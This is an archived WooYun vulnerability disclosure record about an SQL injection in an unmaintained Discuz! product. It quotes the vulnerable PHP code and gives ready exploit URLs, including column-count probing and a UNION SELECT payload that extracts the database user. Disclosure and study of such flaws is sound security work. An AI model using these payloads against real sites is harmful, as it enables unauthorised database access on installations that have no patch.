{"id": 49678, "wybug_id": "wooyun-2014-080470", "wybug_title": "Discuz!某旗下产品多版本SQL注射漏洞", "wybug_corp": "Discuz!", "wybug_author": "路人甲", "wybug_date": "2014-10-24 00:00", "wybug_open_date": "2015-01-22 00:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向公众公开  简要描述： 1 详细说明：  试了6.x 7.x 其他版本没测试, 应该也行的、\nbatch.common.php (218) :02} elseif ($action == 'modelquote') {03         04        //模型评论引用05        $name = empty($_GET['name'])?'':trim($_GET['name']); //无过滤06        $cid = empty($_GET['cid'])?0:intval($_GET['cid']);07        $html = false;08        if(!empty($name) && !empty($cid)) {09                $item = array();10                $query = $_SGLOBAL['db']->query('SELECT * FROM '.tname($name.'comments').' WHERE cid=\\''.$cid.'\\''); //tname处理 然后带入11                if($item = $_SGLOBAL['db']->fetch_array($query)) {12                        $item['message'] = preg_replace(\"/<blockquote.+?<\\/blockquote>/is\", '',$item['message']);13                        $html = '[quote]'.$blang['from_the_original_note'].$item['author'].$blang['at'].sgmdate($item['dateline']).$blang['released'].\"\\n\".cuthtml($item['message'], 100).'[/quote]';14                        showxml($html);15                }16        }17        showxml($html);18         19}\n在看看tname函数:\nfunction/common.func.php (601) :02function tname($name, $mode=0) {03        global $_SC;04        if($mode == 1) {05                return (empty($_SC['dbname_bbs'])?'':'`'.$_SC['dbname_bbs'].'`.').'`'.$_SC['tablepre_bbs'].$name.'`';06        } elseif ($mode == 2) {07                return (empty($_SC['dbname_uch'])?'':'`'.$_SC['dbname_uch'].'`.').'`'.$_SC['tablepre_uch'].$name.'`';08        } else {09                return $_SC['tablepre'].$name;10        }11}\n依然没有过滤、接下来就可以开始注入了、exp如下、\nhttp://xxx//batch.common.php?action=modelquote&cid=1&name=spacecomments [sql] #\n这个后面可以直接order by了 \nhttp://xxx//batch.common.php?action=modelquote&cid=1&name=spacecomments  order by xxx #\n由于版本不同, 所以字段数不一样, 建议先orderby判断下来, 比如7.5的, 就是21个字段, 直接丢个7.5的exp吧\nhttp://xxxxx/batch.common.php?action=modelquote&cid=1&name=spacecomments%20where%201=2%20union%20select%201,2,3,4,5,concat(0x7e,user(),0x7e,0x5430304C7996474F21,0x7e),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21%23\n\n\n   漏洞证明：  当然你也可以直接配置好以后丢工具来跑:\n\n使用safe3不是很好、可以换种工具测试、   修复方案：  Discuz官方是不是可以送些小礼物、、、   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-24 09:26 厂商回复： 该产品已经停止维护，感谢您的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}